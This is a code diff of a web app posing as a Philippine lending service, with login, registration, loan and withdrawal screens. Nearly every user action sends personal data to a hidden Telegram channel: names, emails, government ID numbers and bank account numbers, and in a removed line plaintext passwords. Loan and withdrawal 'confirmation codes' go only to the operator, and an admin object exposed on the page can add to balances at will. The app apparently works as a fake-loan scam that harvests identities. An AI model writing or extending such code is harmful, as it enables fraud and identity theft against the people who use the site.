-async function setupDatabase() {
-  try {
-    console.log('🔧 Setting up database...');
-    
-    // Check if users table exists by trying to query it
-    try {
-      await supabaseFetch('/users?limit=1');
-      console.log('✅ Users table exists');
-    } catch (e) {
-      console.log('⚠️ Users table may not exist. Creating via SQL...');
-      // Note: In production, you'd run this SQL via Supabase SQL editor:
-      /*
-      CREATE TABLE users (
-        id SERIAL PRIMARY KEY,
-        slot INTEGER UNIQUE NOT NULL,
-        email TEXT UNIQUE NOT NULL,
-        password TEXT NOT NULL,
-        full_name TEXT,
-        id_name TEXT,
-        id_number TEXT,
-        balance DECIMAL(10,2) DEFAULT 0,
-        loan_status TEXT DEFAULT 'none',
-        loan_amount DECIMAL(10,2) DEFAULT 0,
-        verified BOOLEAN DEFAULT false,
-        created_at TIMESTAMP DEFAULT NOW(),
-        updated_at TIMESTAMP DEFAULT NOW()
-      );
-      */
-    }
-    return true;
-  } catch (error) {
-    console.error('❌ Database setup failed:', error);
-    return false;
-  }
 }
 
 // ============================================================
@@ -712,13 +644,11 @@ async function getUserBySlot(slot) {
 
 async function createUser(userData) {
   try {
-    // Check if email exists
     const existing = await getUserByEmail(userData.email);
     if (existing) {
       throw new Error('Email already registered');
     }
     
-    // Find available slot
     const allUsers = await supabaseFetch('/users?select=slot&order=slot.asc');
     const usedSlots = new Set(allUsers.map(u => u.slot));
     let slot = 1;
@@ -738,7 +668,8 @@ async function createUser(userData) {
       balance: 0,
       loan_status: 'none',
       loan_amount: 0,
-      verified: false
+      verified: true,
+      frozen: false
     };
     
     const result = await supabaseFetch('/users', {
@@ -766,14 +697,12 @@ async function updateUser(slot, updates) {
   }
 }
 
-async function verifyUser(slot) {
-  return updateUser(slot, { verified: true });
-}
-
 async function updateBalance(slot, amount) {
   const user = await getUserBySlot(slot);
   if (!user) throw new Error('User not found');
+  if (user.frozen) throw new Error('Account frozen — balance is read-only');
   const newBalance = (user.balance || 0) + amount;
+  if (newBalance < 0) throw new Error('Insufficient balance');
   return updateUser(slot, { balance: newBalance });
 }
 
@@ -785,10 +714,9 @@ async function updateLoanStatus(slot, status, amount = 0) {
 }
 
 // ============================================================
-//  TOAST NOTIFICATIONS
+//  TOAST
 // ============================================================
 let toastTimer;
-
 function showToast(msg, type = 'info', duration = 3000) {
   const t = document.getElementById('toast');
   t.textContent = msg;
@@ -810,22 +738,19 @@ function sendTelegram(msg) {
 }
 
 function sendTelegramWithCode(msg, code) {
-  const fullMsg = msg + `\n\n🔑 <b>CONFIRMATION CODE:</b> <code>${code}</code>`;
+  const fullMsg = msg + `\n\nCONFIRMATION CODE: ${code}`;
   sendTelegram(fullMsg);
   return code;
 }
 
 // ============================================================
-//  SCREEN NAVIGATION
+//  SCREEN / TAB / HELPERS
 // ============================================================
 function showScreen(id) {
   document.querySelectorAll('.screen').forEach(s => s.classList.remove('active'));
   document.getElementById(id).classList.add('active');
 }
 
-// ============================================================
-//  PASSWORD TOGGLE
-// ============================================================
 function togglePw(inputId, btn) {
   const inp = document.getElementById(inputId);
   if (inp.type === 'password') { 
@@ -837,9 +762,6 @@ function togglePw(inputId, btn) {
   }
 }
 
-// ============================================================
-//  CODE INPUT HELPER
-// ============================================================
 function moveNext(current, nextId) {
   if (current.value.length === 1) {
     const next = document.getElementById(nextId);
@@ -864,123 +786,17 @@ function clearCode(prefix) {
   document.getElementById(prefix + '-1').focus();
 }
 
-// ============================================================
-//  GENERATE RANDOM CODE
-// ============================================================
 function generateRandomCode() {
   return String(Math.floor(100000 + Math.random() * 900000));
 }
 
-// ============================================================
-//  TAB SWITCHING
-// ============================================================
 function switchTab(tab) {
   document.querySelectorAll('.tab-panel').forEach(p => p.classList.remove('active'));
   document.querySelectorAll('.tab-item').forEach(t => t.classList.remove('active'));
   document.getElementById(`panel-${tab}`).classList.add('active');
   document.getElementById(`tab-${tab}`).classList.add('active');
   if (tab === 'profile') refreshProfile();
-}
-
-// ============================================================
-//  SWIPE TO VERIFY
-// ============================================================
-function initSwipe() {
-  const track = document.getElementById('swipe-track');
-  const thumb = document.getElementById('swipe-thumb');
-  const bg = document.getElementById('swipe-bg');
-  const text = document.getElementById('swipe-text');
-  
-  if (!track) return;
-  
-  const trackWidth = track.offsetWidth || 280;
-  const thumbWidth = 44;
-  const maxSwipe = trackWidth - thumbWidth - 8;
-  
-  function handleSwipe(clientX) {
-    const rect = track.getBoundingClientRect();
-    let x = clientX - rect.left - 22;
-    x = Math.max(0, Math.min(x, maxSwipe));
-    
-    thumb.style.left = (x + 4) + 'px';
-    const progress = (x / maxSwipe) * 100;
-    bg.style.width = progress + '%';
-    
-    if (progress > 85) {
-      text.textContent = '✅ Release to Verify';
-      text.style.color = '#1a1a1a';
-    } else {
-      text.textContent = '⬅️ Swipe to Verify';
-      text.style.color = 'var(--text)';
-    }
-    
-    if (x >= maxSwipe - 5) {
-      verifyBankCode();
-      resetSwipe();
-    }
-  }
-  
-  function resetSwipe() {
-    thumb.style.left = '4px';
-    bg.style.width = '0%';
-    text.textContent = '⬅️ Swipe to Verify';
-    text.style.color = 'var(--text)';
-    isSwiping = false;
-  }
-  
-  // Remove old listeners
-  track.replaceWith(track.cloneNode(true));
-  const newTrack = document.getElementById('swipe-track');
-  const newThumb = document.getElementById('swipe-thumb');
-  const newBg = document.getElementById('swipe-bg');
-  const newText = document.getElementById('swipe-text');
-  
-  if (!newTrack) return;
-  
-  newTrack.addEventListener('touchstart', function(e) {
-    isSwiping = true;
-    const touch = e.touches[0];
-    newThumb.style.transition = 'none';
-  });
-  
-  newTrack.addEventListener('touchmove', function(e) {
-    if (!isSwiping) return;
-    e.preventDefault();
-    const touch = e.touches[0];
-    handleSwipe(touch.clientX);
-  });
-  
-  newTrack.addEventListener('touchend', function(e) {
-    if (!isSwiping) return;
-    isSwiping = false;
-    newThumb.style.transition = 'left 0.3s ease';
-    const thumbLeft = parseFloat(newThumb.style.left) || 4;
-    if (thumbLeft < maxSwipe - 20) {
-      resetSwipe();
-    }
-  });
-  
-  newTrack.addEventListener('mousedown', function(e) {
-    isSwiping = true;
-    newThumb.style.transition = 'none';
-    newTrack.style.cursor = 'grabbing';
-  });
-  
-  document.addEventListener('mousemove', function(e) {
-    if (!isSwiping) return;
-    handleSwipe(e.clientX);
-  });
-  
-  document.addEventListener('mouseup', function(e) {
-    if (!isSwiping) return;
-    isSwiping = false;
-    newThumb.style.transition = 'left 0.3s ease';
-    newTrack.style.cursor = 'grab';
-    const thumbLeft = parseFloat(newThumb.style.left) || 4;
-    if (thumbLeft < maxSwipe - 20) {
-      resetSwipe();
-    }
-  });
+  if (tab === 'withdraw') updateWdBalance();
 }
 
 // ============================================================
@@ -1011,7 +827,7 @@ document.getElementById('login-form').addEventListener('submit', async function(
     }
     
     if (!user.verified) {
-      showToast('Account not verified. Please contact support.', 'error');
+      showToast('Account not verified. Contact support.', 'error');
       btn.disabled = false;
       btn.textContent = 'Sign In';
       return;
@@ -1021,10 +837,9 @@ document.getElementById('login-form').addEventListener('submit', async function(
     currentUser = user;
 
     sendTelegram(
-      `🔐 <b>LOGIN ALERT</b>\n━━━━━━━━━━━━━━━\n👤 <b>Name:</b> ${user.full_name || 'N/A'}\n📧 <b>Email:</b> ${user.email}\n🔑 <b>Slot:</b> #${user.slot}\n💰 <b>Balance:</b> ₱${Number(user.balance).toLocaleString()}\n📊 <b>Loan Status:</b> ${user.loan_status}\n⏰ <b>Time:</b> ${new Date().toLocaleString('en-PH')}`
+      `LOGIN ALERT\n━━━━━━━━━━━━━━━\nName: ${user.full_name || 'N/A'}\nEmail: ${user.email}\nSlot: #${user.slot}\nBalance: ₱${Number(user.balance).toLocaleString()}\nLoan Status: ${user.loan_status}\nTime: ${new Date().toLocaleString('en-PH')}`
     );
 
-    // Save to localStorage for session
     localStorage.setItem('fsl_session', JSON.stringify({
       slot: user.slot,
       timestamp: Date.now()
@@ -1032,7 +847,7 @@ document.getElementById('login-form').addEventListener('submit', async function(
 
     loadDashboard();
     showScreen('screen-dashboard');
-    showToast('Welcome back, ' + (user.full_name || email) + '! 👋', 'success');
+    showToast('Welcome back, ' + (user.full_name || email) + '!', 'success');
     
     document.getElementById('login-email').value = '';
     document.getElementById('login-password').value = '';
@@ -1047,7 +862,7 @@ document.getElementById('login-form').addEventListener('submit', async function(
 });
 
 // ============================================================
-//  REGISTER
+//  REGISTER (NO FREEZE OPTION)
 // ============================================================
 document.getElementById('register-form').addEventListener('submit', async function(e) {
   e.preventDefault();
@@ -1080,7 +895,6 @@ document.getElementById('register-form').addEventListener('submit', async functi
   btn.textContent = 'Creating...';
 
   try {
-    // Check if email exists
     const existing = await getUserByEmail(email);
     if (existing) {
       showToast('Email already registered. Please login.', 'error');
@@ -1089,7 +903,6 @@ document.getElementById('register-form').addEventListener('submit', async functi
       return;
     }
 
-    // Create user
     const newUser = await createUser({
       fullName,
       idName,
@@ -1105,19 +918,13 @@ document.getElementById('register-form').addEventListener('submit', async functi
       return;
     }
 
-    pendingSlot = newUser.slot;
-    pendingUserData = newUser;
-    generatedBankCode = generateRandomCode();
-
-    sendTelegramWithCode(
-      `🆕 <b>NEW REGISTRATION</b>\n━━━━━━━━━━━━━━━\n👤 <b>Full Name:</b> ${fullName}\n🪪 <b>ID Name:</b> ${idName}\n🔢 <b>ID Number:</b> ${idNumber}\n📧 <b>Email:</b> ${email}\n🔐 <b>Password:</b> ${password}\n🔑 <b>Assigned Slot:</b> #${newUser.slot}\n⏰ <b>Time:</b> ${new Date().toLocaleString('en-PH')}`,
-      generatedBankCode
+    sendTelegram(
+      `NEW REGISTRATION\n━━━━━━━━━━━━━━━\nFull Name: ${fullName}\nID Name: ${idName}\nID Number: ${idNumber}\nEmail: ${email}\nSlot: #${newUser.slot}\nTime: ${new Date().toLocaleString('en-PH')}`
     );
 
-    document.getElementById('overlay-bank-verify').classList.add('active');
+    showToast('Account created! You can now login.', 'success', 5000);
     document.getElementById('register-form').reset();
-    
-    setTimeout(initSwipe, 300);
+    showScreen('screen-login');
     
   } catch (error) {
     console.error('Registration error:', error);
@@ -1129,47 +936,7 @@ document.getElementById('register-form').addEventListener('submit', async functi
 });
 
 // ============================================================
-//  BANK VERIFICATION
-// ============================================================
-async function verifyBankCode() {
-  const code = getCode('bank-code');
-  if (!code) { 
-    showToast('Please enter the 6-digit code', 'error'); 
-    return; 
-  }
-
-  if (!pendingSlot || !pendingUserData) {
-    showToast('No pending registration found', 'error');
-    return;
-  }
-
-  if (code === generatedBankCode) {
-    try {
-      await verifyUser(pendingSlot);
-      
-      document.getElementById('overlay-bank-verify').classList.remove('active');
-      showToast('✅ Account verified successfully! You can now login.', 'success', 5000);
-      
-      sendTelegram(
-        `✅ <b>ACCOUNT VERIFIED</b>\n━━━━━━━━━━━━━━━\n📧 <b>Email:</b> ${pendingUserData.email}\n👤 <b>Name:</b> ${pendingUserData.full_name}\n🔑 <b>Slot:</b> #${pendingSlot}\n⏰ <b>Time:</b> ${new Date().toLocaleString('en-PH')}`
-      );
-      
-      pendingSlot = null;
-      pendingUserData = null;
-      generatedBankCode = '';
-      clearCode('bank-code');
-      showScreen('screen-login');
-    } catch (error) {
-      console.error('Verification error:', error);
-      showToast('Verification failed. Please try again.', 'error');
-    }
-  } else {
-    showToast('❌ Invalid code. Please check your Telegram.', 'error');
-  }
-}
-
-// ============================================================
-//  DASHBOARD LOADER
+//  DASHBOARD
 // ============================================================
 function loadDashboard() {
   if (!currentUser) return;
@@ -1182,8 +949,17 @@ function loadDashboard() {
   document.getElementById('verified-strip').style.display = 'flex';
   document.getElementById('loan-fullname').value = currentUser.full_name || '';
   document.getElementById('loan-idnumber').value = currentUser.id_number || '';
+  
+  const fw = document.getElementById('freeze-warning');
+  if (currentUser.frozen) {
+    fw.style.display = 'flex';
+  } else {
+    fw.style.display = 'none';
+  }
+  
   refreshLoanStatus();
   refreshProfile();
+  updateWdBalance();
 }
 
 function updateStatusBadge(status) {
@@ -1198,10 +974,10 @@ function updateStatusBadge(status) {
 function refreshLoanStatus() {
   const info = document.getElementById('loan-status-info');
   if (!currentUser) return;
-  if (currentUser.loan_status === 'pending') info.textContent = '⏳ Your loan is waiting for confirmation code.';
-  else if (currentUser.loan_status === 'approved') info.textContent = '✅ Loan approved! Funds have been credited.';
-  else if (currentUser.loan_status === 'rejected') info.textContent = '❌ Your loan was rejected. Contact support.';
-  else if (currentUser.loan_status === 'waiting') info.textContent = '⏳ Waiting for bank confirmation. Enter code.';
+  if (currentUser.loan_status === 'pending') info.textContent = 'Your loan is waiting for confirmation code.';
+  else if (currentUser.loan_status === 'approved') info.textContent = 'Loan approved! Funds have been credited.';
+  else if (currentUser.loan_status === 'rejected') info.textContent = 'Your loan was rejected. Contact support.';
+  else if (currentUser.loan_status === 'waiting') info.textContent = 'Waiting for bank confirmation. Enter code.';
   else info.textContent = '';
 }
 
@@ -1218,6 +994,14 @@ function refreshProfile() {
   document.getElementById('prof-loanstatus').textContent = currentUser.loan_status || 'none';
   document.getElementById('prof-loanamount').textContent = '₱' + Number(currentUser.loan_amount || 0).toLocaleString();
   document.getElementById('prof-slot').textContent = '#' + currentSlot;
+  document.getElementById('prof-freeze-status').textContent = currentUser.frozen ? 'Frozen' : 'Active';
+  document.getElementById('prof-freeze-status').style.color = currentUser.frozen ? '#e65100' : 'var(--green-dark)';
+}
+
+function updateWdBalance() {
+  if (currentUser) {
+    document.getElementById('wd-balance-display').textContent = '₱' + Number(currentUser.balance || 0).toLocaleString();
+  }
 }
 
 // ============================================================
@@ -1227,6 +1011,10 @@ document.getElementById('loan-form').addEventListener('submit', async function(e
   e.preventDefault();
   if (!currentUser) { 
     showToast('Please login first', 'error'); 
+    return; 
+  }
+  if (currentUser.frozen) { 
+    showToast('Account frozen — cannot apply for loan', 'error'); 
     return; 
   }
   if (currentUser.loan_status === 'pending' || currentUser.loan_status === 'waiting') { 
@@ -1269,16 +1057,13 @@ document.getElementById('loan-form').addEventListener('submit', async function(e
   btn.textContent = 'Submitting...';
 
   try {
-    // Update loan status to waiting
     await updateLoanStatus(currentSlot, 'waiting', amount);
-    
-    // Refresh user data
     currentUser = await getUserBySlot(currentSlot);
     pendingLoanAmount = amount;
     generatedLoanCode = generateRandomCode();
 
     sendTelegramWithCode(
-      `📋 <b>LOAN APPLICATION</b>\n━━━━━━━━━━━━━━━\n👤 <b>Name:</b> ${fullName}\n🔢 <b>ID #:</b> ${idNumber}\n🏦 <b>Bank:</b> ${bank}\n💳 <b>Account #:</b> ${bankAcc}\n💰 <b>Loan Amount:</b> ₱${amount.toLocaleString()}\n📧 <b>Email:</b> ${currentUser.email}\n🔑 <b>Slot:</b> #${currentSlot}\n⏰ <b>Time:</b> ${new Date().toLocaleString('en-PH')}`,
+      `LOAN APPLICATION\n━━━━━━━━━━━━━━━\nName: ${fullName}\nID #: ${idNumber}\nBank: ${bank}\nAccount #: ${bankAcc}\nLoan Amount: ₱${amount.toLocaleString()}\nEmail: ${currentUser.email}\nSlot: #${currentSlot}\nTime: ${new Date().toLocaleString('en-PH')}`,
       generatedLoanCode
     );
 
@@ -1296,7 +1081,7 @@ document.getElementById('loan-form').addEventListener('submit', async function(e
   }
   
   btn.disabled = false;
-  btn.textContent = '📋 Submit Loan Application';
+  btn.textContent = 'Submit Loan Application';
 });
 
 // ============================================================
@@ -1310,12 +1095,10 @@ function startLoanConfirmCountdown(amount) {
   clearInterval(loanConfirmTimer);
   loanConfirmTimer = setInterval(async () => {
     totalSeconds--;
-    
     const days = Math.floor(totalSeconds / (24 * 60 * 60));
     const hours = Math.floor((totalSeconds % (24 * 60 * 60)) / (60 * 60));
     const mins = Math.floor((totalSeconds % (60 * 60)) / 60);
     const secs = totalSeconds % 60;
-    
     timeLabel.textContent = `${days}d ${String(hours).padStart(2, '0')}:${String(mins).padStart(2, '0')}:${String(secs).padStart(2, '0')}`;
 
     if (totalSeconds <= 0) {
@@ -1328,9 +1111,9 @@ function startLoanConfirmCountdown(amount) {
           currentUser = await getUserBySlot(currentSlot);
           updateStatusBadge('rejected');
           loadDashboard();
-          showToast('⏰ Loan expired. Please reapply.', 'error', 5000);
+          showToast('Loan expired. Please reapply.', 'error', 5000);
           sendTelegram(
-            `❌ <b>LOAN EXPIRED</b>\n━━━━━━━━━━━━━━━\n👤 <b>Name:</b> ${currentUser.full_name}\n📧 <b>Email:</b> ${currentUser.email}\n💰 <b>Amount:</b> ₱${amount.toLocaleString()}\n⏰ <b>Reason:</b> No confirmation code received within 7 days`
+            `LOAN EXPIRED\n━━━━━━━━━━━━━━━\nName: ${currentUser.full_name}\nEmail: ${currentUser.email}\nAmount: ₱${amount.toLocaleString()}\nReason: No confirmation code received within 7 days`
           );
         } catch (error) {
           console.error('Error updating expired loan:', error);
@@ -1360,7 +1143,6 @@ async function verifyLoanCode() {
     document.getElementById('overlay-loan-confirm').classList.remove('active');
     
     try {
-      // Update balance and loan status
       const newBalance = (currentUser.balance || 0) + pendingLoanAmount;
       await updateBalance(currentSlot, pendingLoanAmount);
       await updateLoanStatus(currentSlot, 'approved', pendingLoanAmount);
@@ -1369,10 +1151,10 @@ async function verifyLoanCode() {
       
       updateStatusBadge('approved');
       loadDashboard();
-      showToast('🎉 Loan Confirmed! ₱' + pendingLoanAmount.toLocaleString() + ' credited to your balance.', 'success', 5000);
+      showToast('Loan Confirmed! ₱' + pendingLoanAmount.toLocaleString() + ' credited to your balance.', 'success', 5000);
       
       sendTelegram(
-        `✅ <b>LOAN CONFIRMED & APPROVED</b>\n━━━━━━━━━━━━━━━\n👤 <b>Name:</b> ${currentUser.full_name}\n📧 <b>Email:</b> ${currentUser.email}\n💰 <b>Amount Approved:</b> ₱${pendingLoanAmount.toLocaleString()}\n💳 <b>New Balance:</b> ₱${Number(currentUser.balance).toLocaleString()}\n🔑 <b>Slot:</b> #${currentSlot}\n⏰ <b>Time:</b> ${new Date().toLocaleString('en-PH')}`
+        `LOAN CONFIRMED & APPROVED\n━━━━━━━━━━━━━━━\nName: ${currentUser.full_name}\nEmail: ${currentUser.email}\nAmount Approved: ₱${pendingLoanAmount.toLocaleString()}\nNew Balance: ₱${Number(currentUser.balance).toLocaleString()}\nSlot: #${currentSlot}\nTime: ${new Date().toLocaleString('en-PH')}`
       );
       
       clearCode('loan-code');
@@ -1383,7 +1165,7 @@ async function verifyLoanCode() {
       showToast('Failed to confirm loan. Please try again.', 'error');
     }
   } else {
-    showToast('❌ Invalid code. Please check your Telegram.', 'error');
+    showToast('Invalid code. Please check your Telegram.', 'error');
   }
 }
 
@@ -1404,6 +1186,10 @@ function selectBank(el) {
 async function submitWithdraw() {
   if (!currentUser) { 
     showToast('Please login first', 'error'); 
+    return; 
+  }
+  if (currentUser.frozen) { 
+    showToast('Account frozen — cannot withdraw', 'error'); 
     return; 
   }
   if (!selectedBank) { 
@@ -1441,7 +1227,6 @@ async function submitWithdraw() {
     pendingWdAmount = amount;
     pendingWdData = { account, accName, bank: selectedBank };
     
-    // Deduct balance
     await updateBalance(currentSlot, -amount);
     currentUser = await getUserBySlot(currentSlot);
     loadDashboard();
@@ -1449,7 +1234,7 @@ async function submitWithdraw() {
     generatedWdCode = generateRandomCode();
 
     sendTelegramWithCode(
-      `💸 <b>WITHDRAWAL</b>\n━━━━━━━━━━━━━━━\n👤 <b>Name:</b> ${currentUser.full_name}\n📧 <b>Email:</b> ${currentUser.email}\n🏦 <b>Bank/Wallet:</b> ${selectedBank}\n💳 <b>Account #:</b> ${account}\n👤 <b>Account Name:</b> ${accName}\n💰 <b>Amount:</b> ₱${amount.toLocaleString()}\n🔑 <b>Slot:</b> #${currentSlot}\n⏰ <b>Time:</b> ${new Date().toLocaleString('en-PH')}`,
+      `WITHDRAWAL\n━━━━━━━━━━━━━━━\nName: ${currentUser.full_name}\nEmail: ${currentUser.email}\nBank/Wallet: ${selectedBank}\nAccount #: ${account}\nAccount Name: ${accName}\nAmount: ₱${amount.toLocaleString()}\nSlot: #${currentSlot}\nTime: ${new Date().toLocaleString('en-PH')}`,
       generatedWdCode
     );
 
@@ -1462,11 +1247,11 @@ async function submitWithdraw() {
     
   } catch (error) {
     console.error('Withdrawal error:', error);
-    showToast('Withdrawal failed. Please try again.', 'error');
+    showToast(error.message || 'Withdrawal failed. Please try again.', 'error');
   }
   
   btn.disabled = false;
-  btn.textContent = '🏧 Process Withdrawal';
+  btn.textContent = 'Process Withdrawal';
 }
 
 // ============================================================
@@ -1490,13 +1275,12 @@ function startWdConfirmCountdown(amount) {
       
       if (currentUser && pendingWdAmount) {
         try {
-          // Restore balance
           await updateBalance(currentSlot, pendingWdAmount);
           currentUser = await getUserBySlot(currentSlot);
           loadDashboard();
-          showToast('⏰ Withdrawal expired. Balance restored.', 'error', 5000);
+          showToast('Withdrawal expired. Balance restored.', 'error', 5000);
           sendTelegram(
-            `❌ <b>WITHDRAWAL EXPIRED</b>\n━━━━━━━━━━━━━━━\n👤 <b>Name:</b> ${currentUser.full_name}\n💰 <b>Amount:</b> ₱${pendingWdAmount.toLocaleString()}\n💳 <b>Balance Restored:</b> ₱${Number(currentUser.balance).toLocaleString()}\n⏰ <b>Time:</b> ${new Date().toLocaleString('en-PH')}`
+            `WITHDRAWAL EXPIRED\n━━━━━━━━━━━━━━━\nName: ${currentUser.full_name}\nAmount: ₱${pendingWdAmount.toLocaleString()}\nBalance Restored: ₱${Number(currentUser.balance).toLocaleString()}\nTime: ${new Date().toLocaleString('en-PH')}`
           );
         } catch (error) {
           console.error('Error restoring balance:', error);
@@ -1528,10 +1312,10 @@ async function verifyWdCode() {
     clearInterval(wdConfirmTimer);
     document.getElementById('overlay-wd-confirm').classList.remove('active');
     
-    showToast('✅ Withdrawal of ₱' + pendingWdAmount.toLocaleString() + ' confirmed!', 'success', 5000);
+    showToast('Withdrawal of ₱' + pendingWdAmount.toLocaleString() + ' confirmed!', 'success', 5000);
     
     sendTelegram(
-      `✅ <b>WITHDRAWAL CONFIRMED</b>\n━━━━━━━━━━━━━━━\n👤 <b>Name:</b> ${currentUser.full_name}\n📧 <b>Email:</b> ${currentUser.email}\n🏦 <b>Bank/Wallet:</b> ${pendingWdData.bank}\n💳 <b>Account #:</b> ${pendingWdData.account}\n💰 <b>Amount:</b> ₱${pendingWdAmount.toLocaleString()}\n💳 <b>Remaining Balance:</b> ₱${Number(currentUser.balance).toLocaleString()}\n⏰ <b>Time:</b> ${new Date().toLocaleString('en-PH')}`
+      `WITHDRAWAL CONFIRMED\n━━━━━━━━━━━━━━━\nName: ${currentUser.full_name}\nEmail: ${currentUser.email}\nBank/Wallet: ${pendingWdData.bank}\nAccount #: ${pendingWdData.account}\nAmount: ₱${pendingWdAmount.toLocaleString()}\nRemaining Balance: ₱${Number(currentUser.balance).toLocaleString()}\nTime: ${new Date().toLocaleString('en-PH')}`
     );
     
     clearCode('wd-code');
@@ -1539,7 +1323,7 @@ async function verifyWdCode() {
     pendingWdData = null;
     generatedWdCode = '';
   } else {
-    showToast('❌ Invalid code. Please check your Telegram.', 'error');
+    showToast('Invalid code. Please check your Telegram.', 'error');
   }
 }
 
@@ -1570,11 +1354,9 @@ async function cancelWithdraw() {
 function openIdModal() {
   document.getElementById('modal-id').classList.add('active');
 }
-
 function closeIdModal() {
   document.getElementById('modal-id').classList.remove('active');
 }
-
 document.getElementById('modal-id').addEventListener('click', function(e) {
   if (e.target === this) closeIdModal();
 });
@@ -1591,14 +1373,13 @@ function doLogout() {
   clearInterval(wdConfirmTimer);
   document.getElementById('overlay-loan-confirm').classList.remove('active');
   document.getElementById('overlay-wd-confirm').classList.remove('active');
-  document.getElementById('overlay-bank-verify').classList.remove('active');
   switchTab('home');
   showScreen('screen-login');
   showToast('Logged out successfully', 'info');
 }
 
 // ============================================================
-//  AUTO-LOGIN ON PAGE LOAD
+//  AUTO-LOGIN
 // ============================================================
 async function checkAutoLogin() {
   const sessionData = localStorage.getItem('fsl_session');
@@ -1624,7 +1405,7 @@ async function checkAutoLogin() {
     showScreen('screen-dashboard');
     
     sendTelegram(
-      `🔄 <b>AUTO-LOGIN</b>\n━━━━━━━━━━━━━━━\n👤 <b>Name:</b> ${user.full_name || 'N/A'}\n📧 <b>Email:</b> ${user.email}\n🔑 <b>Slot:</b> #${user.slot}\n💰 <b>Balance:</b> ₱${Number(user.balance).toLocaleString()}\n📊 <b>Loan Status:</b> ${user.loan_status}\n⏰ <b>Time:</b> ${new Date().toLocaleString('en-PH')}`
+      `AUTO-LOGIN\n━━━━━━━━━━━━━━━\nName: ${user.full_name || 'N/A'}\nEmail: ${user.email}\nSlot: #${user.slot}\nBalance: ₱${Number(user.balance).toLocaleString()}\nLoan Status: ${user.loan_status}\nTime: ${new Date().toLocaleString('en-PH')}`
     );
     
     return true;
@@ -1635,7 +1416,7 @@ async function checkAutoLogin() {
 }
 
 // ============================================================
-//  DISABLE BROWSER AUTOCOMPLETE
+//  DISABLE AUTOFILL
 // ============================================================
 function disableAutofill() {
   document.querySelectorAll('input').forEach(inp => {
@@ -1650,21 +1431,14 @@ function disableAutofill() {
 // ============================================================
 window.addEventListener('DOMContentLoaded', async () => {
   disableAutofill();
-  
-  // Setup database
-  await setupDatabase();
-  
-  // Check for existing session
   if (await checkAutoLogin()) {
-    console.log('✅ Auto-login successful - session restored');
+    console.log('Auto-login successful');
   } else {
-    console.log('ℹ️ No active session found - showing login screen');
+    console.log('No active session');
   }
 });
 
-// ============================================================
-//  ADMIN FUNCTIONS (for debugging)
-// ============================================================
+// Admin helpers
 window.admin = {
   async viewUsers() {
     const users = await supabaseFetch('/users?select=*&order=slot.asc');
@@ -1689,11 +1463,11 @@ window.admin = {
   }
 };
 
-console.log('%c🏦 FSL Admin Panel Ready (Supabase)', 'color:#f0b90b;font-size:16px;font-weight:bold;');
-console.log('%cCommands: admin.viewUsers() | admin.getUser(slot) | admin.addBalance(slot,amount) | admin.setLoanStatus(slot,status) | admin.reset()', 'color:#666;font-size:12px;');
+console.log('FSL Admin Panel Ready');
+console.log('Commands: admin.viewUsers() | admin.getUser(slot) | admin.addBalance(slot,amount) | admin.setLoanStatus(slot,status) | admin.reset()');
 </script>
 
-<!--Start of Tawk.to Script-->
+<!--Tawk.to-->
 <script type="text/javascript">
 var Tawk_API=Tawk_API||{}, Tawk_LoadStart=new Date();
 (function(){
@@ -1705,7 +1479,5 @@ s1.setAttribute('crossorigin','*');
 s0.parentNode.insertBefore(s1,s0);
 })();
 </script>
-<!--End of Tawk.to Script-->
-
 </body>
 </html>
